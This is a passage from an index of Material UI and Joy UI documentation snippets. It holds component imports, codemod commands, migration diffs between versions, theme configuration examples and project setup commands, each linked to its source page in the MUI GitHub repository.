lighten(0.2, theme.palette.primary.main) }}\n  >\n    {props.children}\n  </Button>\n);\n// Note: for direct theme access without modification, you can also use a shortcut by providing the key as a string\nconst MyStyledButton = (props) => (\n  <Button sx={{ backgroundColor: 'primary.main' }}>{props.children}</Button>\n);\n```\n\n----------------------------------------\n\nTITLE: Importing Portal Component in React\nDESCRIPTION: Shows how to import the Portal component from Material-UI in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/portal/portal.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Portal from '@mui/material/Portal';\n```\n\n----------------------------------------\n\nTITLE: Running Theme Migration Codemods for Material UI v6\nDESCRIPTION: Commands to run codemods that automatically convert theme.palette.mode checks to theme.applyStyles in styled components, sx props, and theme files.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_25\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/styled <path/to/folder-or-file>\nnpx @mui/codemod@latest v6.0.0/sx-prop <path/to/folder-or-file>\nnpx @mui/codemod@latest v6.0.0/theme-v6 <path/to/theme-file>\n```\n\n----------------------------------------\n\nTITLE: InputBase Box Sizing Update\nDESCRIPTION: New default box sizing model for InputBase component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_23\n\nLANGUAGE: css\nCODE:\n```\nbox-sizing: border-box;\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Justify Prop in React\nDESCRIPTION: Renames Grid's 'justify' prop to 'justifyContent'. This codemod updates the Grid component to use the new prop naming in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_85\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid justify=\"left\">Item</Grid>\n+<Grid item justifyContent=\"left\">Item</Grid>\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/grid-justify-justifycontent <path>\n```\n\n----------------------------------------\n\nTITLE: Inefficient Conditional Styling in Joy UI Theme (Anti-pattern)\nDESCRIPTION: This snippet demonstrates an inefficient way of applying different styles based on color scheme using a conditional operator. This approach is not recommended as it creates styles for both color schemes, leading to performance issues.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\n// 🚫 Don't do this\nextendTheme({\n  components: {\n    JoyChip: {\n      styleOverrides: {\n        root: ({ ownerState, theme }) => ({\n          // styles will be created for both color schemes which is not performant\n          boxShadow: theme.palette.mode === 'dark' ? 'none' : theme.vars.shadow.sm,\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Updating IconButton Size Prop in React\nDESCRIPTION: Adds 'size=\"large\"' if 'size' is not defined to get the same appearance as v4. This codemod ensures consistent IconButton sizing when migrating to Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_87\n\nLANGUAGE: diff\nCODE:\n```\n-<IconButton size=\"medium\" />\n-<IconButton />\n+<IconButton size=\"medium\" />\n+<IconButton size=\"large\" />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/icon-button-size <path>\n```\n\n----------------------------------------\n\nTITLE: Creating Template Page in React with MUI\nDESCRIPTION: Basic template setup for creating a new page in Material UI documentation using AppTheme and TemplateFrame components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport * as React from 'react';\nimport AppTheme from 'docs/src/modules/components/AppTheme';\nimport TemplateFrame from 'docs/src/modules/components/TemplateFrame';\nimport Template from 'docs/data/material/getting-started/templates/<name>/<Template>';\n\nexport default function Page() {\n  return (\n    <AppTheme>\n      <TemplateFrame>\n        <Template />\n      </TemplateFrame>\n    </AppTheme>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Transformed Import Format with Extensions\nDESCRIPTION: Example showing the transformed import format after applying the plugin. File extensions and directory indexes are added to comply with ESM module resolution requirements.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/babel-plugin-resolve-imports/README.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\n// packages/mui-material/build/index.js\nexport * from './Accordion/index.js';\n\n// packages/mui-material/build/Breadcrumbs/BreadcrumbCollapsed.js\nimport MoreHorizIcon from '../internal/svg-icons/MoreHoriz.js';\n```\n\n----------------------------------------\n\nTITLE: Migrating from experimentalStyled to styled\nDESCRIPTION: Shows the required import change when migrating from the deprecated experimentalStyled function to the current styled function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n-import { experimentalStyled as styled } from '@mui/material/styles';\n+import { styled } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Importing Circular Progress Component in React\nDESCRIPTION: Shows how to import the CircularProgress component from the Joy UI library.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/circular-progress/circular-progress.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport CircularProgress from '@mui/joy/CircularProgress';\n```\n\n----------------------------------------\n\nTITLE: Importing Alert Component in React\nDESCRIPTION: Basic import statement for the Alert component from Joy UI package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/alert/alert.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Alert from '@mui/joy/Alert';\n```\n\n----------------------------------------\n\nTITLE: Migrating Layout Components for Pigment CSS\nDESCRIPTION: This snippet shows how to replace layout components with their Pigment CSS-compatible versions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n-import Container from '@mui/material/Container';\n+import Container from '@mui/material-pigment-css/Container';\n\n-import Grid from '@mui/material/Grid';\n+import Grid from '@mui/material-pigment-css/Grid';\n\n-import Stack from '@mui/material/Stack';\n+import Stack from '@mui/material-pigment-css/Stack';\n\n-import Hidden from '@mui/material/Hidden';\n+import Hidden from '@mui/material-pigment-css/Hidden';\n```\n\n----------------------------------------\n\nTITLE: Running sx-prop Codemod for Migrating Dynamic Styles\nDESCRIPTION: This snippet shows the command to run the codemod for migrating dynamic styles using the sx prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/sx-prop path/to/folder\n```\n\n----------------------------------------\n\nTITLE: Updating MobileStepper Props in MUI\nDESCRIPTION: Transformation of MobileStepper LinearProgressProps to the new slotProps pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_59\n\nLANGUAGE: diff\nCODE:\n```\n<MobileStepper\n-  LinearProgressProps={{ color: 'primary' }}\n+  slotProps={{ progress: { color: 'primary' } }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Controlling Print Display with sx Prop in Material UI JSX\nDESCRIPTION: Demonstrates using the `displayPrint` key within the `sx` prop to set the CSS `display` property specifically for print media, effectively applying styles within an `@media print` query. This example hides the element when printed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ displayPrint: 'none' }} /> // equivalent to '@media print': { display: 'none' }\n```\n\n----------------------------------------\n\nTITLE: Updating Button Variant Properties\nDESCRIPTION: Diff showing the migration from deprecated button variants (flat, raised) to the new variants (text, contained).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n-<Button variant=\"raised\" />\n+<Button variant=\"contained\" />\n```\n\n----------------------------------------\n\nTITLE: Importing SnackbarContent Component in React\nDESCRIPTION: Import statement for the SnackbarContent component used to add custom content to Snackbars.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/snackbars/snackbars.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport SnackbarContent from '@mui/material/SnackbarContent';\n```\n\n----------------------------------------\n\nTITLE: Migrating withStyles from JSS to TSS-React\nDESCRIPTION: Shows how to migrate the withStyles HOC from Material-UI v4's JSS implementation to the type-safe implementation in TSS-React, maintaining the same styling functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n-import Button from '@material-ui/core/Button';\n+import Button from '@mui/material/Button';\n-import withStyles from '@material-ui/styles/withStyles';\n+import { withStyles } from 'tss-react/mui';\n\n const MyCustomButton = withStyles(\n+  Button,\n   (theme) => ({\n     root: {\n       minHeight: '30px',\n     },\n     textPrimary: {\n       color: theme.palette.text.primary,\n     },\n     '@media (min-width: 960px)': {\n       textPrimary: {\n         fontWeight: 'bold',\n       },\n     },\n   }),\n-)(Button);\n+);\n\n export default MyCustomButton;\n```\n\n----------------------------------------\n\nTITLE: Updating Theme Palette augmentColor Usage\nDESCRIPTION: Diff showing the updated usage of theme.palette.augmentColor() which now returns a new object instead of modifying the input.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n-const background = { main: color };\n-theme.palette.augmentColor(background);\n+const background = theme.palette.augmentColor({ main: color });\n\n console.log({ background });\n```\n\n----------------------------------------\n\nTITLE: Updating InputLabel Classes\nDESCRIPTION: Migration from FormLabelClasses to classes prop for style overrides.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n <InputLabel\n-  FormLabelClasses={{ asterisk: 'bar' }}\n+  classes={{ asterisk: 'bar' }}\n >\n   Foo\n </InputLabel>\n```\n\n----------------------------------------\n\nTITLE: Updating InputBase Classes for Proper Selector Hierarchy\nDESCRIPTION: Transforms InputBase component class selectors to use proper parent-child relationship in styling for various input states like size, multiline, and adorned.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_51\n\nLANGUAGE: diff\nCODE:\n```\n import { inputBaseClasses } from '@mui/material/InputBase';\n\n MuiInputBase: {\n   styleOverrides: {\n     root: {\n-      [`& .${inputBaseClasses.inputSizeSmall}`]: {\n+      [`&.${inputBaseClasses.sizeSmall} > .${inputBaseClasses.input}`]: {\n         color: 'red',\n       },\n-      [`& .${inputBaseClasses.inputMultiline}`]: {\n+      [`&.${inputBaseClasses.multiline} > .${inputBaseClasses.input}`]: {\n         color: 'red',\n       },\n-      [`& .${inputBaseClasses.inputAdornedStart}`]: {\n+      [`&.${inputBaseClasses.adornedStart} > .${inputBaseClasses.input}`]: {\n         color: 'red',\n       },\n-      [`& .${inputBaseClasses.inputAdornedEnd}`]: {\n+      [`&.${inputBaseClasses.adornedEnd} > .${inputBaseClasses.input}`]: {\n         color: 'red',\n       },\n-      [`& .${inputBaseClasses.inputHiddenLabel}`]: {\n+      [`&.${inputBaseClasses.hiddenLabel} > .${inputBaseClasses.input}`]: {\n         color: 'red',\n       },\n     },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Synchronizing Local Master Branch\nDESCRIPTION: Commands to synchronize the local master branch with the upstream repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit checkout master\ngit pull upstream master\n```\n\n----------------------------------------\n\nTITLE: Updating TableCell Padding\nDESCRIPTION: Migration from dense padding prop to size prop for small cells.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_21\n\nLANGUAGE: diff\nCODE:\n```\n-<TableCell padding=\"dense\" />\n+<TableCell size=\"small\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring Material UI Theme for Portal Elements\nDESCRIPTION: Theme configuration to ensure portal-related elements are injected under the main app wrapper, maintaining consistency with Tailwind CSS styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst rootElement = document.getElementById(\"root\");\nconst root = createRoot(rootElement);\n\nconst theme = createTheme({\n  components: {\n    MuiPopover: {\n      defaultProps: {\n        container: rootElement,\n      },\n    },\n    MuiPopper: {\n      defaultProps: {\n        container: rootElement,\n      },\n    },\n    MuiDialog: {\n      defaultProps: {\n        container: rootElement,\n      },\n    },\n    MuiModal: {\n      defaultProps: {\n        container: rootElement,\n      },\n    },\n  },\n});\n\nroot.render(\n  <StyledEngineProvider injectFirst>\n    <ThemeProvider theme={theme}>\n      <App />\n    </ThemeProvider>\n  </StyledEngineProvider>\n);\n```\n\n----------------------------------------\n\nTITLE: Generating Switch Component Theme Styles\nDESCRIPTION: Theme configuration generated by Sync plugin for customizing the Switch component's checked state, medium size, and primary color to match iOS styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/design-resources/material-ui-sync/material-ui-sync.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  components: {\n    MuiSwitch: {\n      styleOverrides: {\n        root: {\n          '&.MuiSwitch-sizeMedium:has(.MuiSwitch-colorPrimary)': {\n            '&:has(.Mui-checked):not(:has(.Mui-disabled)):not(:has(.Mui-focusVisible))': {\n              width: '40px',\n              height: '21px',\n              padding: '0',\n              '& .MuiSwitch-switchBase': {\n                transform: 'translateX(19px) translateY(2px)',\n                padding: '0',\n                '& .MuiSwitch-thumb': {\n                  width: '17px',\n                  height: '17px',\n                  background: '#FAFAFA',\n                },\n                '& + .MuiSwitch-track': {\n                  width: '38px',\n                  height: '21px',\n                  background: 'var(--mui-palette-success-light)',\n                  opacity: '1',\n                },\n              },\n            },\n          },\n        },\n      },\n    },\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Stack with Margin on Children Example (JSX)\nDESCRIPTION: Demonstrates a limitation where applying margin directly to Stack children is not supported by default, as shown in this example where the Button's marginTop will be ignored.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stack/stack.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack>\n  <Button sx={{ marginTop: '30px' }}>...</Button>\n</Stack>\n```\n\n----------------------------------------\n\nTITLE: Importing Checkbox Component in React\nDESCRIPTION: Basic import statement for the Checkbox component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/checkbox/checkbox.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Checkbox from '@mui/joy/Checkbox';\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Component Import\nDESCRIPTION: Changes required to import the stabilized Grid component without the Unstable_ prefix.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/migrating-to-v6/migrating-to-v6.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n- import { Unstable_Grid as Grid } from '@mui/system';\n+ import { Grid } from '@mui/system';\n```\n\nLANGUAGE: diff\nCODE:\n```\n- import Grid from '@mui/system/Unstable_Grid';\n+ import Grid from '@mui/system/Grid';\n```\n\n----------------------------------------\n\nTITLE: Comparing CSS Theme Variables to Default Method in Material UI\nDESCRIPTION: A markdown table comparing the performance metrics of using CSS theme variables versus the default method in Material UI for server-side applications. It highlights differences in HTML size, First Contentful Paint (FCP), and Time to Interactive (TTI).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/overview.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|                                                              | Compare to the default method | Reason                                                                                                         |\n| :----------------------------------------------------------- | :---------------------------- | :------------------------------------------------------------------------------------------------------------- |\n| HTML size                                                    | Bigger                        | CSS variables are generated for both light and dark mode at build time.                                        |\n| [First Contentful Paint (FCP)](https://web.dev/articles/fcp) | Longer                        | Since the HTML size is bigger, the time to download the HTML before showing the content is a bit longer.       |\n| [Time to Interactive (TTI)](https://web.dev/articles/tti)    | Shorter (for dark mode)       | Stylesheets are not regenerated between light and dark mode, a lot less time is spent running JavaScript code. |\n```\n\n----------------------------------------\n\nTITLE: Using useColorScheme Hook in JavaScript\nDESCRIPTION: This snippet demonstrates the structure and return value of the useColorScheme hook, which provides access to the current color scheme mode and a function to set it.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nuseColorScheme: () => {\n  mode: string,\n  setMode: (mode) => {...}\n}\n```\n\n----------------------------------------\n\nTITLE: Starting Development Server with Different Package Managers\nDESCRIPTION: Commands for starting the development server after configuring Pigment CSS, using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nnpm run dev\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm dev\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn dev\n```\n\n----------------------------------------\n\nTITLE: Migrating useTheme Hook for Pigment CSS\nDESCRIPTION: This snippet shows how to update the import for the useTheme hook to use Pigment CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_25\n\nLANGUAGE: diff\nCODE:\n```\n-import { useTheme } from '@mui/material/styles';\n+import { useTheme } from '@mui/material-pigment-css';\n```\n\n----------------------------------------\n\nTITLE: Disabling Global Transitions in Material UI\nDESCRIPTION: Method to disable all transitions globally in Material UI applications through theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material';\n\nconst theme = createTheme({\n  transitions: {\n    // So `transition: none;` gets applied everywhere\n    create: () => 'none',\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Downloading and Setting up Material UI Express SSR Example\nDESCRIPTION: Commands to download the Material UI Express SSR example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-express-ssr/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-express-ssr\ncd material-ui-express-ssr\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons with yarn\nDESCRIPTION: Command to install @mui/icons-material and its dependencies using yarn package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/material-icons/material-icons.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/icons-material @mui/material @emotion/styled @emotion/react\n```\n\n----------------------------------------\n\nTITLE: Using Font Icons with Material UI\nDESCRIPTION: Example of using the Icon component to display icons from icon fonts, specifically the Material Icons font.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport Icon from '@mui/material/Icon';\n\n<Icon>star</Icon>;\n```\n\n----------------------------------------\n\nTITLE: Setting Block Display in Material-UI\nDESCRIPTION: Example of using the Box component with block display property. This transforms inline elements to behave as block elements, placing each on a new line.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box component=\"span\" sx={{ display: 'block' }}>block</Box>\n<Box component=\"span\" sx={{ display: 'block' }}>block</Box>\n```\n\n----------------------------------------\n\nTITLE: Installing and Running Material UI Remix TypeScript Example\nDESCRIPTION: Commands to install the project dependencies and start the development server for the Material UI Remix TypeScript example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-remix-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Styles v4 with npm or yarn\nDESCRIPTION: Command line instructions for installing Material UI styles version 4 using either npm or yarn package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @material-ui/styles\n\nor\n\nyarn add @material-ui/styles\n```\n\n----------------------------------------\n\nTITLE: Updating createStyles Import Path\nDESCRIPTION: Diff showing the updated import path for createStyles, which was moved from @mui/material/styles to @mui/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n-import { createStyles } from '@mui/material/styles';\n+import { createStyles } from '@mui/styles';\n```\n\n----------------------------------------\n\nTITLE: Fixing DOM Node Issues with Transition Components - Fragment Example\nDESCRIPTION: Shows incorrect and correct ways to use React.Fragment with Material UI transition components like Fade. The transition components require a DOM node as their direct child.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n// Ex. 1-1 ❌ This will cause an error because the Fragment is not a DOM node:\n<Fade in>\n  <React.Fragment>\n    <CustomComponent />\n  </React.Fragment>\n</Fade>\n```\n\nLANGUAGE: jsx\nCODE:\n```\n// Ex. 1-2 ✅ Add a DOM node such as this div:\n<Fade in>\n  <div>\n    <CustomComponent />\n  </div>\n</Fade>\n```\n\n----------------------------------------\n\nTITLE: Updating color imports for Material UI v1.0.0\nDESCRIPTION: This codemod updates color imports to match the new location and structure of Material UI color palettes in v1.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_123\n\nLANGUAGE: diff\nCODE:\n```\n-import { blue, teal500 } from 'material-ui/styles/colors';\n+import blue from '@material-ui/core/colors/blue';\n+import teal from '@material-ui/core/colors/teal';\n+const teal500 = teal['500'];\n```\n\n----------------------------------------\n\nTITLE: Adding TypeScript Document Props\nDESCRIPTION: TypeScript configuration for adding DocumentHeadTagsProps to the Document component props interface.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n+import type { DocumentHeadTagsProps } from '@mui/material-nextjs/v15-pagesRouter';\n // or `v1X-pagesRouter` if you are using Next.js v1X\n\n+export default function MyDocument(props: DocumentProps & DocumentHeadTagsProps) {\n   ...\n }\n```\n\n----------------------------------------\n\nTITLE: Renaming TablePagination event handler props in React\nDESCRIPTION: Renames onChangeRowsPerPage to onRowsPerPageChange and onChangePage to onPageChange for API consistency in TablePagination.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_31\n\nLANGUAGE: diff\nCODE:\n```\n  <TablePagination\n-  onChangeRowsPerPage={()=>{}}\n-  onChangePage={()=>{}}\n+  onRowsPerPageChange={()=>{}}\n+  onPageChange={()=>{}}\n```\n\n----------------------------------------\n\nTITLE: Lab Components Migration Codemod (v7.0.0)\nDESCRIPTION: Updates imports of components moved from @mui/lab to @mui/material, including Alert, Autocomplete, and other components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_63\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod v7.0.0/lab-removed-components <path>\n```\n\nLANGUAGE: diff\nCODE:\n```\n- import { Alert } from '@mui/lab';\n+ import { Alert } from '@mui/material';\n```\n\nLANGUAGE: diff\nCODE:\n```\n- import Alert, { alertClasses } from '@mui/lab/Alert';\n+ import Alert, { alertClasses } from '@mui/material/Alert';\n```\n\n----------------------------------------\n\nTITLE: Migrating from Fab Button Variant to Fab Component\nDESCRIPTION: Diff showing the migration from using Button with variant='fab' to the dedicated Fab component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n-import Button from '@material-ui/core/Button';\n-<Button variant=\"fab\" />\n+import Fab from '@material-ui/core/Fab';\n+<Fab />\n```\n\n----------------------------------------\n\nTITLE: Applying Styles in Shadow DOM with Material UI\nDESCRIPTION: This snippet demonstrates how to create a shadow DOM container and apply styles within it using Material UI's CacheProvider.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/shadow-dom/shadow-dom.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\nconst container = document.querySelector('#root');\nconst shadowContainer = container.attachShadow({ mode: 'open' });\nconst shadowRootElement = document.createElement('div');\nshadowContainer.appendChild(shadowRootElement);\n\nconst cache = createCache({\n  key: 'css',\n  prepend: true,\n  container: shadowContainer,\n});\n\nReactDOM.createRoot(shadowRootElement).render(\n  <CacheProvider value={cache}>\n    <App />\n  </CacheProvider>,\n);\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting Joy UI Next.js TypeScript Example\nDESCRIPTION: Commands to download the Joy UI Next.js TypeScript example from the Material-UI GitHub repository and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/joy-ui-nextjs-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/joy-ui-nextjs-ts\ncd joy-ui-nextjs-ts\n```\n\n----------------------------------------\n\nTITLE: Importing Color Inversion Utilities in JavaScript\nDESCRIPTION: Demonstrates how to import the applySolidInversion and applySoftInversion utilities from the Joy UI package. These utilities are used to apply color inversion to custom components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/color-inversion/color-inversion.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { applySolidInversion, applySoftInversion } from '@mui/joy/colorInversion';\n```\n\n----------------------------------------\n\nTITLE: Creating CSS Grid Layout with Material-UI Box Component\nDESCRIPTION: This code snippet shows how to create a CSS grid layout using the Box component from Material-UI, demonstrating an alternative to the Grid component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q2-update.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box display=\"grid\" gridTemplateColumns=\"repeat(12, 1fr)\" gap={2}>\n  <Box gridColumn=\"span 8\">\n    <Item>xs=8</Item>\n  </Box>\n  <Box gridColumn=\"span 4\">\n    <Item>xs=4</Item>\n  </Box>\n  <Box gridColumn=\"span 4\">\n    <Item>xs=4</Item>\n  </Box>\n  <Box gridColumn=\"span 8\">\n    <Item>xs=8</Item>\n  </Box>\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Importing Stack Component in React\nDESCRIPTION: Basic import statement for the Stack component from the MUI system package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/stack/stack.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Stack from '@mui/system/Stack';\n```\n\n----------------------------------------\n\nTITLE: Importing Pigment CSS Styles\nDESCRIPTION: Import statement for including Pigment CSS styles in the application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport '@pigment-css/react/styles.css';\n```\n\n----------------------------------------\n\nTITLE: Configuring Legacy Negative Margins in v5\nDESCRIPTION: Shows how to apply negative margins similar to GridLegacy in Material UI v5 by setting theme default props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_9\n\nLANGUAGE: js\nCODE:\n```\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\nimport Grid from '@mui/material/Unstable_Grid2';\n\nconst theme = createTheme({\n  components: {\n    MuiGrid2: {\n      defaultProps: {\n        // all grids under this theme will apply\n        // negative margin on the top and left sides.\n        disableEqualOverflow: true,\n      },\n    },\n  },\n});\n\nfunction Demo() {\n  return (\n    <ThemeProvider theme={theme}>\n      <Grid container>...grids</Grid>\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Horizontal Centering in Material-UI\nDESCRIPTION: Example of centering an element horizontally using margin auto values and fixed width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ mx: 'auto', width: 200 }}>…\n```\n\n----------------------------------------\n\nTITLE: Importing FormControl and FormHelperText Components\nDESCRIPTION: Import statements for FormControl and FormHelperText components, used to add helper text to Checkboxes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/checkbox/checkbox.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport FormControl from 